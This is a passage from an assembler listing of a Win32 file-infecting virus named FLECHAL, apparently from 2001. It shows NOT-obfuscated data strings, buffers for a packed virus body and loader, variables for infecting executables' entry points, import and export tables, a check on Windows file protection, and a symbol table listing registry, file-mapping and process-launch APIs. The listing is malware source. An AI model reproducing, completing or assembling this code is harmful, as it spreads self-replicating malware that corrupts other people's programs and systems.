   6009		  9A DF	8C 92 9E 93 93+	 020h, not 073h, not 06dh, not 061h, not 06ch, not 06ch, not 065h, not 072h
   6010		  9A 8D
   6011	00002EE0  DF 8B	97 9A DF 9D 9A+	    db not 020h, not 074h, not 068h, not 065h, not 020h, not 062h, not 065h, not 074h, not  +
   6012		  8B 8B	9A 8D DF C5 D6+	 074h, not 065h, not 072h, not 020h, not 03ah, not 029h, not 00dh, not 00ah
   6013		  F2 F5
   6014	00002EF0  BC 90	8F 86 8D 96 98+	    db not 043h, not 06fh, not 070h, not 079h, not 072h, not 069h, not 067h, not 068h, not  +
   6015		  97 8B	DF D7 9C D6 DF+	 074h, not 020h, not 028h, not 063h, not 029h, not 020h, not 031h, not 039h
   6016		  CE C6
   6017	00002F00  C6 C7	D2 C6 C6 DF 9D+	    db not 039h, not 038h, not 02dh, not 039h, not 039h, not 020h, not 062h, not 079h, not  +
   6018		  86 DF	B5 90 9A 8D 98+	 020h, not 04ah, not 06fh, not 065h, not 072h, not 067h, not 065h, not 06eh
   6019		  9A 91
   6020	00002F10  DF B6	9D 8C 9A 91 DF+	    db not 020h, not 049h, not 062h, not 073h, not 065h, not 06eh, not 020h, not 02fh, not  +
   6021		  D0 DF	B5 96 9D 85 D3+	 020h, not 04ah, not 069h, not 062h, not 07ah, not 02ch, not 020h, not 041h
   6022		  DF BE
   6023	00002F20  93 93	DF AD 96 98 97+	    db not 06ch, not 06ch, not 020h, not 052h, not 069h, not 067h, not 068h, not 074h, not  +
   6024		  8B 8C	DF AD 9A 8C 9A+	 073h, not 020h, not 052h, not 065h, not 073h, not 065h, not 072h, not 076h
   6025		  8D 89
   6026	00002F30  9A 9B	F2 F5 F2 F5 AB+	    db not 065h, not 064h, not 00dh, not 00ah, not 00dh, not 00ah, not 054h, not 068h, not  +
   6027		  97 96	8C DF 9C 90 8F+	 069h, not 073h, not 020h, not 063h, not 06fh, not 070h, not 079h, not 020h
   6028		  86 DF
   6029	00002F40  90 99	DF 9E AF B3 96+	    db not 06fh, not 066h, not 020h, not 061h, not 050h, not 04ch, not 069h, not 062h, not  +
   6030		  9D DF	96 8C DF 99 8D+	 020h, not 069h, not 073h, not 020h, not 066h, not 072h, not 065h, not 065h
   6031		  9A 9A
   6032	00002F50  DF 99	90 8D DF 91 90+	    db not 020h, not 066h, not 06fh, not 072h, not 020h, not 06eh, not 06fh, not 06eh, not  +
   6033		  91 D2	8F 8D 90 99 96+	 02dh, not 070h, not 072h, not 06fh, not 066h, not 069h, not 074h, not 061h
   6034		  8B 9E
   6035	00002F60  9D 93	9A DF 8A 8C 9A+	    db not 062h, not 06ch, not 065h, not 020h, not 075h, not 073h, not 065h, not 02eh, not  +
   6036		  D1 F2	F5 F2 F5 B9 90+	 00dh, not 00ah, not 00dh, not 00ah, not 046h, not 06fh, not 072h, not 020h
   6037		  8D DF
   6038	00002F70  92 90	8D 9A DF 96 91+	    db not 06dh, not 06fh, not 072h, not 065h, not 020h, not 069h, not 06eh, not 066h, not  +
   6039		  99 90	8D 92 9E 8B 96+	 06fh, not 072h, not 06dh, not 061h, not 074h, not 069h, not 06fh, not 06eh
   6040		  90 91
   6041	00002F80  C5 DF	97 8B 8B 8F C5+	    db not 03ah, not 020h, not 068h, not 074h, not 074h, not 070h, not 03ah, not 02fh, not  +
   6042		  D0 D0	9E 8F 9E 9C 94+	 02fh, not 061h, not 070h, not 061h, not 063h, not 06bh, not 02eh, not 063h
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 107
FLECHAL.asm



   6043		  D1 9C
   6044	00002F90  95 9D	D1 91 9A 8B D0+	    db not 06ah, not 062h, not 02eh, not 06eh, not 065h, not 074h, not 02fh, not 00dh, not  +
   6045		  F2 F5	F2 F5 FF FF FF+	 00ah, not 00dh, not 00ah, not 000h, not 000h, not 000h, not 000h, not 000h
   6046		  FF FF
   6047	00002FA0  B0 E4	86 D6 14 36 1A+	    db not 04fh, not 01bh, not 079h, not 029h, not 0ebh, not 0c9h, not 0e5h, not 042h, not  +
   6048		  BD 5A	BF 31 4F EE 12+	 0a5h, not 040h, not 0ceh, not 0b0h, not 011h, not 0edh, not 02ch, not 024h
   6049		  D3 DB
   6050	00002FB0  CA 9F	82 4B 2B D6 FE+	    db not 035h, not 060h, not 07dh, not 0b4h, not 0d4h, not 029h, not 001h, not 080h, not  +
   6051		  7F C6	00 4D 7F 37 C6+	 039h, not 0ffh, not 0b2h, not 080h, not 0c8h, not 039h, not 09ch, not 01ch
   6052		  63 E3
   6053
   6054	00002FC0			    _end label
   6055
   6056	00002FC0			    .data?
   6057
   6058	00000000  0104*(??)		    NAM_flechal	db MAX_PATH dup	(?)
   6059	00000104  ????????		    phkResult_1	dd ?
   6060
   6061	00000108			    hWnd_file_ini label
   6062
   6063	00000108  ????????		    hWnd_tmapi	dd ?
   6064	0000010C  ????????		    InitTmTable	dd ?
   6065	00000110  ????????		    GetTmElementByIndex	 dd ?
   6066	00000114  ????????		    CloseTmTable   dd ?
   6067
   6068	00000118  ????????		    _create_flag dd ?
   6069	0000011C  ????????		    _file_attrib dd ?
   6070	00000120  ????????		    _access_type dd ?
   6071	00000124  08*(??) 08*(??) 08* +	    _file_time	FILETIME <?>,<?>,<?>
   6072		  (??)
   6073	0000013C  ????????		    _file_size	dd ?
   6074	00000140  ????????		    _map_access_type  dd ?
   6075	00000144  ????????		    _mview_access_type	 dd ?
   6076
   6077	00000148  ????????		    hWnd_CreateFile   dd ?
   6078	0000014C  ????????		    hWnd_CreateFileMapping  dd ?
   6079	00000150  ????????		    hWnd_MapViewOfFile	 dd ?
   6080
   6081	00000154			    hWnd_file_end label
   6082
   6083	00000154  ????????		    hWnd_imagehlp  dd ?
   6084	00000158  ????????		    ImageNtHeader dd ?
   6085	0000015C  ????????		    ImageRvaToSection dd ?
   6086	00000160  ????????		    ImageRvaToVa   dd ?
   6087
   6088	00000164  ????????		    _image_nt_headers dd ?
   6089	00000168  ????????		    _infect_entry_point	 dd ?
   6090	0000016C  ????????		    _infect_EP_section	 dd ?
   6091
   6092	00000170  ????????		    _infect_export_dir_rva  dd ?
   6093	00000174  ????????		    _infect_import_dir_rva  dd ?
   6094
   6095	00000178  ????????		    _infect_export_sz	 dd ?
   6096	0000017C  ????????		    _infect_export_dir_va   dd ?
   6097	00000180  ????????		    _infect_export_names dd ?
   6098	00000184  ????????		    _infect_biggest_rva	 dd ?
   6099	00000188  ????????		    _infect_last_section dd ?
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 108
FLECHAL.asm



   6100	0000018C  ????????		    _infect_flechal_rva	 dd ?
   6101	00000190  ????????		    _infect_lib_rva dd ?
   6102	00000194  ????????		    _infect_compress_space_1   dd ?
   6103	00000198  ????????		    _infect_compress_space_2   dd ?
   6104	0000019C  ????????		    _infect_compress_addr_1 dd ?
   6105	000001A0  ????????		    _infect_virtual_raw	 dd ?  ;  bigger of v-size and raw
   6106
   6107	000001A4  ????????		    hWnd_sfc dd	?
   6108	000001A8  ????????		    SfcIsFileProtected	 dd ?
   6109
   6110	000001AC  ????????		    hWnd_file_infect  dd ?
   6111
   6112	000001B0  ????????		    _look_4_function  dd ?
   6113	000001B4  ????????		    _kernel_import_va dd ?
   6114	000001B8  ????????		    _import_function  dd ?
   6115
   6116	000001BC  ????????		    _viral_pack_packet_sz   dd ?  ;  packed virus size + loader	size
   6117	000001C0  6000*(??)		    _viral_pack_packet_addr db 24 * 1024 dup(?)
   6118
   6119	000061C0  ????????		    _viral_temp_sz	 dd ?  ;  packed main .exe
   6120	000061C4  6000*(??)		    _viral_temp_buffer_1 db 24 * 1024 dup(?)
   6121
   6122	0000C1C4  0A0000*(??)		    workmem db 640 * 1024 dup(?)
   6123
   6124	000AC1C4  ????????		    aplib@013 dd ?
   6125	000AC1C8  ????????		    aplib@009 dd ?
   6126	000AC1CC  ????????		    aplib@017 dd ?
   6127	000AC1D0  ????????		    aplib@014 dd ?
   6128	000AC1D4  ????????		    aplib@004 dd ?
   6129	000AC1D8  ????????		    aplib@003 dd ?
   6130	000AC1DC  ????????		    aplib@086 dd ?
   6131	000AC1E0  ????????		    aplib@015 dd ?
   6132	000AC1E4  ????????		    aplib@005 dd ?
   6133	000AC1E8  ????????		    aplib@016 dd ?
   6134
   6135	000AC1EC  ????????		    aplib@010 dd ?
   6136	000AC1F0  0400*(??)			      db 400h dup(?)
   6137
   6138	000AC5F0  ????????		    orig_esp dd	?
   6139	000AC5F4  ????????		    lpszSubKey_1   dd ?
   6140
   6141					    end	_start
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 109
Symbol Table




Symbol Name			  Type	 Value

.16				  Near32 FLAT:07AB
.2				  Near32 FLAT:0678
.32				  Near32 FLAT:2D95
.34				  Near32 FLAT:2DA4
.64				  Near32 FLAT:0FFB
.8				  Near32 FLAT:0778
??DATE				  Text	 "06-15-01"
??FILENAME			  Text	 "FLECHAL "
??TIME				  Text	 "01:57:01"
??VERSION			  Number 0500
@32BIT				  Text	 1
@CODE				  Text	 FLAT
@CODESIZE			  Text	 0
@CPU				  Text	 4853H
@CURSEG				  Text	 _BSS
@DATA				  Text	 FLAT
@DATASIZE			  Text	 0
@FILENAME			  Text	 FLECHAL
@INTERFACE			  Text	 000H
@MODEL				  Text	 1
@STACK				  Text	 FLAT
@WORDSIZE			  Text	 4
APLIB@001			  Near32 FLAT:2966
APLIB@002			  Near32 FLAT:2968
APLIB@003			  Dword	 FLAT:000AC1D8
APLIB@004			  Dword	 FLAT:000AC1D4
APLIB@005			  Dword	 FLAT:000AC1E4
APLIB@006			  Dword	 FLAT:2EC0
APLIB@007			  Near32 FLAT:200B
APLIB@008			  Near32 FLAT:2328
APLIB@009			  Dword	 FLAT:000AC1C8
APLIB@010			  Dword	 FLAT:000AC1EC
APLIB@011			  Near32 FLAT:2054
APLIB@012			  Near32 FLAT:2044
APLIB@013			  Dword	 FLAT:000AC1C4
APLIB@014			  Dword	 FLAT:000AC1D0
APLIB@015			  Dword	 FLAT:000AC1E0
APLIB@016			  Dword	 FLAT:000AC1E8
APLIB@017			  Dword	 FLAT:000AC1CC
APLIB@018			  Near32 FLAT:27C7
APLIB@019			  Near32 FLAT:2112
APLIB@020			  Near32 FLAT:232F
APLIB@021			  Near32 FLAT:26E2
APLIB@022			  Near32 FLAT:2349
APLIB@023			  Near32 FLAT:1C94
APLIB@024			  Near32 FLAT:2442
APLIB@025			  Near32 FLAT:1728
APLIB@026			  Near32 FLAT:21C3
APLIB@027			  Near32 FLAT:21F6
APLIB@028			  Near32 FLAT:2472
APLIB@029			  Near32 FLAT:1455
APLIB@030			  Near32 FLAT:2393
APLIB@031			  Near32 FLAT:2482
APLIB@032			  Near32 FLAT:22BC
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 110
Symbol Table



APLIB@033			  Near32 FLAT:24C0
APLIB@034			  Near32 FLAT:230C
APLIB@035			  Near32 FLAT:2700
APLIB@036			  Near32 FLAT:20CF
APLIB@037			  Near32 FLAT:212B
APLIB@038			  Near32 FLAT:2434
APLIB@039			  Near32 FLAT:214D
APLIB@040			  Near32 FLAT:22F3
APLIB@041			  Near32 FLAT:2641
APLIB@042			  Near32 FLAT:268E
APLIB@043			  Near32 FLAT:23C1
APLIB@044			  Near32 FLAT:2402
APLIB@045			  Near32 FLAT:25BA
APLIB@046			  Near32 FLAT:14B1
APLIB@047			  Near32 FLAT:2422
APLIB@048			  Near32 FLAT:237C
APLIB@049			  Near32 FLAT:21AD
APLIB@050			  Near32 FLAT:2247
APLIB@051			  Near32 FLAT:22B2
APLIB@052			  Near32 FLAT:257C
APLIB@053			  Near32 FLAT:2540
APLIB@054			  Near32 FLAT:2536
APLIB@055			  Near32 FLAT:2605
APLIB@056			  Near32 FLAT:2634
APLIB@057			  Near32 FLAT:2621
APLIB@058			  Near32 FLAT:19A6
APLIB@059			  Near32 FLAT:26BB
APLIB@060			  Near32 FLAT:2699
APLIB@061			  Near32 FLAT:26D8
APLIB@062			  Near32 FLAT:266E
APLIB@063			  Near32 FLAT:263F
APLIB@064			  Near32 FLAT:26B2
APLIB@065			  Near32 FLAT:266A
APLIB@066			  Near32 FLAT:231A
APLIB@067			  Near32 FLAT:26F2
APLIB@068			  Near32 FLAT:26E7
APLIB@069			  Near32 FLAT:2322
APLIB@070			  Near32 FLAT:271E
APLIB@071			  Near32 FLAT:275F
APLIB@072			  Near32 FLAT:278E
APLIB@073			  Near32 FLAT:277B
APLIB@074			  Near32 FLAT:27B5
APLIB@075			  Near32 FLAT:27A6
APLIB@076			  Near32 FLAT:2835
APLIB@077			  Near32 FLAT:2858
APLIB@078			  Near32 FLAT:2803
APLIB@079			  Near32 FLAT:27F2
APLIB@080			  Near32 FLAT:282A
APLIB@081			  Near32 FLAT:281B
APLIB@082			  Near32 FLAT:27F0
APLIB@083			  Near32 FLAT:2863
APLIB@084			  Near32 FLAT:293F
APLIB@085			  Near32 FLAT:28DF
APLIB@086			  Dword	 FLAT:000AC1DC
APLIB@087			  Near32 FLAT:28FF
APLIB@088			  Near32 FLAT:291F
APLIB@089			  Near32 FLAT:283C
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 111
Symbol Table



APLIB@090			  Near32 FLAT:2875
APLIB@091			  Near32 FLAT:2894
APLIB@092			  Near32 FLAT:28B3
APLIB@093			  Near32 FLAT:2847
APLIB@094			  Near32 FLAT:149E
APLIB@095			  Near32 FLAT:146A
APLIB@096			  Near32 FLAT:14A7
APLIB@097			  Near32 FLAT:1490
APLIB@098			  Near32 FLAT:159B
APLIB@099			  Near32 FLAT:1684
APLIB@100			  Near32 FLAT:15A4
APLIB@101			  Near32 FLAT:15AE
APLIB@102			  Near32 FLAT:15BF
APLIB@103			  Near32 FLAT:1706
APLIB@104			  Near32 FLAT:1717
APLIB@105			  Near32 FLAT:174A
APLIB@106			  Near32 FLAT:1751
APLIB@107			  Near32 FLAT:1788
APLIB@108			  Near32 FLAT:1796
APLIB@109			  Near32 FLAT:189D
APLIB@110			  Near32 FLAT:18AC
APLIB@111			  Near32 FLAT:147D
APLIB@112			  Near32 FLAT:1489
APLIB@113			  Near32 FLAT:14AC
APLIB@114			  Near32 FLAT:1559
APLIB@115			  Near32 FLAT:14E2
APLIB@116			  Near32 FLAT:1566
APLIB@117			  Near32 FLAT:14F0
APLIB@118			  Near32 FLAT:1573
APLIB@119			  Near32 FLAT:14FE
APLIB@120			  Near32 FLAT:157D
APLIB@121			  Near32 FLAT:150C
APLIB@122			  Near32 FLAT:1587
APLIB@123			  Near32 FLAT:1518
APLIB@124			  Near32 FLAT:1591
APLIB@125			  Near32 FLAT:1524
APLIB@126			  Near32 FLAT:1538
APLIB@127			  Near32 FLAT:153C
APLIB@128			  Near32 FLAT:153E
APLIB@129			  Near32 FLAT:1553
APLIB@130			  Near32 FLAT:168E
APLIB@131			  Near32 FLAT:169D
APLIB@132			  Near32 FLAT:16AA
APLIB@133			  Near32 FLAT:16B7
APLIB@134			  Near32 FLAT:16C4
APLIB@135			  Near32 FLAT:16CD
APLIB@136			  Near32 FLAT:16DA
APLIB@137			  Near32 FLAT:16E3
APLIB@138			  Near32 FLAT:16F0
APLIB@139			  Near32 FLAT:16F9
APLIB@140			  Near32 FLAT:15DB
APLIB@141			  Near32 FLAT:15ED
APLIB@142			  Near32 FLAT:15FF
APLIB@143			  Near32 FLAT:1616
APLIB@144			  Near32 FLAT:1624
APLIB@145			  Near32 FLAT:1635
APLIB@146			  Near32 FLAT:1643
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 112
Symbol Table



APLIB@147			  Near32 FLAT:1654
APLIB@148			  Near32 FLAT:1662
APLIB@149			  Near32 FLAT:1671
APLIB@150			  Near32 FLAT:179C
APLIB@151			  Near32 FLAT:1774
APLIB@152			  Near32 FLAT:1882
APLIB@153			  Near32 FLAT:188B
APLIB@154			  Near32 FLAT:1878
APLIB@155			  Near32 FLAT:1867
APLIB@156			  Near32 FLAT:1856
APLIB@157			  Near32 FLAT:1845
APLIB@158			  Near32 FLAT:1834
APLIB@159			  Near32 FLAT:1823
APLIB@160			  Near32 FLAT:1812
APLIB@161			  Near32 FLAT:1801
APLIB@162			  Near32 FLAT:17F0
APLIB@163			  Near32 FLAT:17E2
APLIB@164			  Near32 FLAT:17D4
APLIB@165			  Near32 FLAT:17C8
APLIB@166			  Near32 FLAT:17BC
APLIB@167			  Near32 FLAT:17B0
APLIB@168			  Near32 FLAT:17A7
APLIB@169			  Near32 FLAT:18BB
APLIB@170			  Near32 FLAT:18CA
APLIB@171			  Near32 FLAT:18D9
APLIB@172			  Near32 FLAT:18E8
APLIB@173			  Near32 FLAT:18FA
APLIB@174			  Near32 FLAT:190C
APLIB@175			  Near32 FLAT:191E
APLIB@176			  Near32 FLAT:1930
APLIB@177			  Near32 FLAT:1942
APLIB@178			  Near32 FLAT:1954
APLIB@179			  Near32 FLAT:1966
APLIB@180			  Near32 FLAT:1978
APLIB@181			  Near32 FLAT:198A
APLIB@182			  Near32 FLAT:199C
APLIB@183			  Near32 FLAT:1A64
APLIB@184			  Near32 FLAT:1A50
APLIB@185			  Near32 FLAT:19EE
APLIB@186			  Near32 FLAT:1A5A
APLIB@187			  Near32 FLAT:19FC
APLIB@188			  Near32 FLAT:1A12
APLIB@189			  Near32 FLAT:1A36
APLIB@190			  Near32 FLAT:1AF5
APLIB@191			  Near32 FLAT:1B02
APLIB@192			  Near32 FLAT:1B0F
APLIB@193			  Near32 FLAT:1A9E
APLIB@194			  Near32 FLAT:1BBB
APLIB@195			  Near32 FLAT:1B98
APLIB@196			  Near32 FLAT:1ACF
APLIB@197			  Near32 FLAT:1BA5
APLIB@198			  Near32 FLAT:1BAE
APLIB@199			  Near32 FLAT:1AE9
APLIB@200			  Near32 FLAT:1AB7
APLIB@201			  Near32 FLAT:1A6E
APLIB@202			  Near32 FLAT:1A80
APLIB@203			  Near32 FLAT:1B84
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 113
Symbol Table



APLIB@204			  Near32 FLAT:1B15
APLIB@205			  Near32 FLAT:1B8E
APLIB@206			  Near32 FLAT:1B21
APLIB@207			  Near32 FLAT:1B27
APLIB@208			  Near32 FLAT:1B2D
APLIB@209			  Near32 FLAT:1B44
APLIB@210			  Near32 FLAT:1C59
APLIB@211			  Near32 FLAT:1C36
APLIB@212			  Near32 FLAT:1B5D
APLIB@213			  Near32 FLAT:1C43
APLIB@214			  Near32 FLAT:1B6B
APLIB@215			  Near32 FLAT:1C4C
APLIB@216			  Near32 FLAT:1B77
APLIB@217			  Near32 FLAT:1ADD
APLIB@218			  Near32 FLAT:1BFA
APLIB@219			  Near32 FLAT:1BC1
APLIB@220			  Near32 FLAT:1C04
APLIB@221			  Near32 FLAT:1BCB
APLIB@222			  Near32 FLAT:1C0A
APLIB@223			  Near32 FLAT:1BD3
APLIB@224			  Near32 FLAT:1C14
APLIB@225			  Near32 FLAT:1C1F
APLIB@226			  Near32 FLAT:1C84
APLIB@227			  Near32 FLAT:1C5F
APLIB@228			  Near32 FLAT:1C8E
APLIB@229			  Near32 FLAT:1C69
APLIB@230			  Near32 FLAT:1C79
APLIB@231			  Near32 FLAT:1CCD
APLIB@232			  Near32 FLAT:1D60
APLIB@233			  Near32 FLAT:1D5C
APLIB@234			  Near32 FLAT:1D58
APLIB@235			  Near32 FLAT:1D03
APLIB@236			  Near32 FLAT:1D05
APLIB@237			  Near32 FLAT:1D72
APLIB@238			  Near32 FLAT:1FA9
APLIB@239			  Near32 FLAT:1E00
APLIB@240			  Near32 FLAT:1DF8
APLIB@241			  Near32 FLAT:1DEE
APLIB@242			  Near32 FLAT:1DEA
APLIB@243			  Near32 FLAT:1DE6
APLIB@244			  Near32 FLAT:1DD3
APLIB@245			  Near32 FLAT:1DD1
APLIB@246			  Near32 FLAT:1DB9
APLIB@247			  Near32 FLAT:1E48
APLIB@248			  Near32 FLAT:1F71
APLIB@249			  Near32 FLAT:1FC7
APLIB@250			  Near32 FLAT:1F89
APLIB@251			  Near32 FLAT:1F87
APLIB@252			  Near32 FLAT:1EFD
APLIB@253			  Near32 FLAT:1EFB
APLIB@254			  Near32 FLAT:1F6D
APLIB@255			  Near32 FLAT:1ED3
APLIB@256			  Near32 FLAT:1EDF
APLIB@257			  Near32 FLAT:1F24
APLIB@258			  Near32 FLAT:1E91
APLIB@259			  Near32 FLAT:1E76
APLIB@260			  Near32 FLAT:1E6C
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 114
Symbol Table



APLIB@261			  Near32 FLAT:1E5B
APLIB@262			  Near32 FLAT:1FCB
CLOSEHANDLE (CloseHandle)	  Near32 FLAT:---- Extern
CLOSETMTABLE			  Dword	 FLAT:0114
CMP_SECTION			  Near32 FLAT:0FCB
CODEPAIR			  Near32 FLAT:2B8C
CODE_SIZE			  Number 2600
COPYFILEA (CopyFileA)		  Near32 FLAT:---- Extern
CREATEFILEA (CreateFileA)	  Near32 FLAT:---- Extern
CREATEFILEMAPPINGA	       +  Near32 FLAT:---- Extern
(CreateFileMappingA)
CREATEMUTEXA (CreateMutexA)	  Near32 FLAT:---- Extern
CREATE_ALWAYS			  Number 0002
DEBUG				  Alias	 YES
DELTA				  Near32 FLAT:2BFD
DOMATCH				  Near32 FLAT:2BCB
DOMATCH_WITH_2INC		  Near32 FLAT:2BC9
DOMATCH_WITH_INC		  Near32 FLAT:2BCA
DONEDEPACKING			  Near32 FLAT:2BF1
END_CMP_SECTION			  Near32 FLAT:0FEA
END_LOCATE_IMPORT		  Near32 FLAT:1433
ERROR_SUCCESS			  Alias	 NULL
EXITPROCESS (ExitProcess)	  Near32 FLAT:---- Extern
FALSE				  Alias	 NULL
FILE_ATTRIBUTE_COMPRESSED	  Number 0800
FILE_ATTRIBUTE_DIRECTORY	  Number 0010
FILE_ATTRIBUTE_NORMAL		  Number 0080
FILE_BEGIN			  Number 0000
FILE_MAP_READ			  Number 0004
FILE_MAP_WRITE			  Number 0002
FILE_SHARE_READ			  Number 0001
FREELIBRARY (FreeLibrary)	  Near32 FLAT:---- Extern
GENERIC_READ			  Number 80000000
GENERIC_WRITE			  Number 40000000
GETBIT				  Near32 FLAT:2BD5
GETFILEATTRIBUTESA	       +  Near32 FLAT:---- Extern
(GetFileAttributesA)
GETFILESIZE (GetFileSize)	  Near32 FLAT:---- Extern
GETFILETIME (GetFileTime)	  Near32 FLAT:---- Extern
GETGAMMA			  Near32 FLAT:2BDF
GETGAMMALOOP			  Near32 FLAT:2BE2
GETGAMMA_NO_ECX			  Near32 FLAT:2BE1
GETMODULEFILENAMEA	       +  Near32 FLAT:---- Extern
(GetModuleFileNameA)
GETMODULEHANDLEA	       +  Near32 FLAT:---- Extern
(GetModuleHandleA)
GETMOREBITS			  Near32 FLAT:2B7E
GETPROCADDRESS (GetProcAddress)	  Near32 FLAT:---- Extern
GETTICKCOUNT (GetTickCount)	  Near32 FLAT:---- Extern
GETTMELEMENTBYINDEX		  Dword	 FLAT:0110
GETWINDOWSDIRECTORYA	       +  Near32 FLAT:---- Extern
(GetWindowsDirectoryA)
GLOBALALLOC (GlobalAlloc)	  Near32 FLAT:---- Extern
GLOBALFREE (GlobalFree)		  Near32 FLAT:---- Extern
GMEM_ZEROINIT			  Number 0040
HEADER_SIZE			  Number 0A00
HKEY_LOCAL_MACHINE		  Number 80000002
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 115
Symbol Table



HWND_CREATEFILE			  Dword	 FLAT:0148
HWND_CREATEFILEMAPPING		  Dword	 FLAT:014C
HWND_FILE_END			  Dword	 FLAT:0154
HWND_FILE_INFECT		  Dword	 FLAT:01AC
HWND_FILE_INI			  Dword	 FLAT:0108
HWND_IMAGEHLP			  Dword	 FLAT:0154
HWND_MAPVIEWOFFILE		  Dword	 FLAT:0150
HWND_SFC			  Dword	 FLAT:01A4
HWND_TMAPI			  Dword	 FLAT:0108
I				  Number -0001
IMAGENTHEADER			  Dword	 FLAT:0158
IMAGERVATOSECTION		  Dword	 FLAT:015C
IMAGERVATOVA			  Dword	 FLAT:0160
IMAGE_DIRECTORY_ENTRY_EXPORT	  Number 0000
IMAGE_DIRECTORY_ENTRY_IMPORT	  Number 0001
IMAGE_NUMBEROF_DIRECTORY_ENTRIES  Number 0010
IMAGE_OPTIONAL_HEADER		  Text	 IMAGE_OPTIONAL_HEADER32
INDEX_TM			  Number FLAT:03E0
INITTMTABLE			  Dword	 FLAT:010C
ISBADREADPTR (IsBadReadPtr)	  Near32 FLAT:---- Extern
J				  Number 0000
K				  Number 004C
KEY_ALL_ACCESS			  Number 000F003F
L				  Number 000A
L0				  Number 000C
LITERAL				  Near32 FLAT:2B62
LOADLIBRARYA (LoadLibraryA)	  Near32 FLAT:---- Extern
LOCATE_IMPORT			  Near32 FLAT:12ED
LPSZSUBKEY_1			  Dword	 FLAT:000AC5F4
LSTRCMP	(lstrcmp)		  Near32 FLAT:---- Extern
LSTRCMPI (lstrcmpi)		  Near32 FLAT:---- Extern
LSTRLEN	(lstrlen)		  Near32 FLAT:---- Extern
LSTRLENA (lstrlenA)		  Near32 FLAT:---- Extern
L_END				  Dword	 FLAT:2EBC
L_OK				  Near32 FLAT:2D2D
L_SIZE				  Dword	 FLAT:2EB8
L_START				  Dword	 FLAT:29AC
L_START_1			  Dword	 FLAT:29AE
MAPVIEWOFFILE (MapViewOfFile)	  Near32 FLAT:---- Extern
MAX_PATH			  Number 0104
MESSAGEBOX			  Number BFF5412E
MESSAGEBOXA			  Dword	 FLAT:2EBC
NAM_FLECHAL			  Byte	 FLAT:0000
NEXTTAG				  Near32 FLAT:2B63
NORMALCODEPAIR			  Near32 FLAT:2BA9
NULL				  Number 0000
OPENMUTEXA (OpenMutexA)		  Near32 FLAT:---- Extern
OPEN_EXISTING			  Number 0003
ORIG_ESP			  Dword	 FLAT:000AC5F0
PAGE_EXECUTE_READWRITE		  Number 0040
PAGE_EXECUTE_WRITECOPY		  Number 0080
PAGE_READONLY			  Number 0002
PAGE_READWRITE			  Number 0004
PFDWOLDPROTECT			  Dword	 FLAT:2D77
PFDWOLDPROTECT_2		  Dword	 FLAT:2C11
PFDWOLDPROTECT_3		  Dword	 FLAT:2CD2
PHKRESULT_1			  Dword	 FLAT:0104
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 116
Symbol Table



Q				  Number 0003
REGCREATEKEYEXA		       +  Near32 FLAT:---- Extern
(RegCreateKeyExA)
REGQUERYVALUEEXA	       +  Near32 FLAT:---- Extern
(RegQueryValueExA)
REGSETVALUEEXA (RegSetValueExA)	  Near32 FLAT:---- Extern
REG_NONE			  Alias	 NULL
REG_SZ				  Number 0001
RND_EAX				  Near32 FLAT:298A
RND_INI				  Near32 FLAT:2974
RND_INI_LOOP_1			  Near32 FLAT:297B
S				  Number 0000
SEED				  Number FLAT:298D
SETENDOFFILE (SetEndOfFile)	  Near32 FLAT:---- Extern
SETFILEATTRIBUTESA	       +  Near32 FLAT:---- Extern
(SetFileAttributesA)
SETFILEPOINTER (SetFilePointer)	  Near32 FLAT:---- Extern
SETFILETIME (SetFileTime)	  Near32 FLAT:---- Extern
SFCISFILEPROTECTED		  Dword	 FLAT:01A8
SHELLEXECUTEA (ShellExecuteA)	  Near32 FLAT:---- Extern
SHORTMATCH			  Near32 FLAT:2B9D
STILLBITSLEFT			  Near32 FLAT:2BDE
SW_SHOW				  Number 0005
S_RET				  Number FLAT:2D28
T				  Number 0000
TRUE				  Number 0001
UNMAPVIEWOFFILE		       +  Near32 FLAT:---- Extern
(UnmapViewOfFile)
WORKMEM				  Byte	 FLAT:C1C4
_4				  Near32 FLAT:2CB2
_ACCESS_TYPE			  Dword	 FLAT:0120
_API_ADDR_END			  Dword	 FLAT:2EB8
_API_ADDR_INI			  Dword	 FLAT:2E8C
_API_INDEX_1			  Near32 FLAT:2AE7
_API_INDEX_2			  Near32 FLAT:2AF2
_AP_DEPACK_ASM			  Near32 FLAT:2B54
_AP_NOT				  Near32 FLAT:0020
_AP_PACK			  Near32 FLAT:1439
_BIGGEST_RVA			  Near32 FLAT:10B9
_BIGGEST_RVA_END		  Near32 FLAT:10EB
_CHECK_KNOW_SECTION		  Near32 FLAT:0F36
_CLOSEHANDLE			  Dword	 FLAT:2E94
_CLOSE_1			  Near32 FLAT:12DD
_CLOSE_2			  Near32 FLAT:12D2
_CLOSE_3			  Near32 FLAT:12B9
_CLOSE_4			  Near32 FLAT:128D
_CLOSE_FILE			  Near32 FLAT:127B
_CMP_1				  Near32 FLAT:1007
_CMP_RET			  Near32 FLAT:105F
_COMPRESSED_CODE_PLACE		  Number FLAT:2DCE
_COPYDONE			  Near32 FLAT:01C9
_CREATEFILEA			  Dword	 FLAT:2E8C
_CREATEPROCESSA			  Dword	 FLAT:2EA8
_CREATE_FLAG			  Dword	 FLAT:0118
_CURRENT_FNAME			  Dword	 FLAT:0F19
_DEFAULT			  Near32 FLAT:01FE
_END				  Dword	 FLAT:2FC0
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 117
Symbol Table



_EXIT				  Near32 FLAT:01F1
_EXIT_COM_DEL			  Near32 FLAT:0126
_FILE_ATTRIB			  Dword	 FLAT:011C
_FILE_SIZE			  Dword	 FLAT:013C
_FILE_TIME			  Struct FLAT:0124 FILETIME
_FIND_FUNCTION			  Near32 FLAT:138A
_FIND_FUNCTION_1		  Near32 FLAT:1363
_FIND_KERNEL			  Near32 FLAT:130F
_GETSTARTUPINFOA		  Dword	 FLAT:2EAC
_GETTEMPFILENAMEA		  Dword	 FLAT:2EA4
_GETTEMPPATHA			  Dword	 FLAT:2EA0
_GLOBALALLOC			  Dword	 FLAT:2EB0
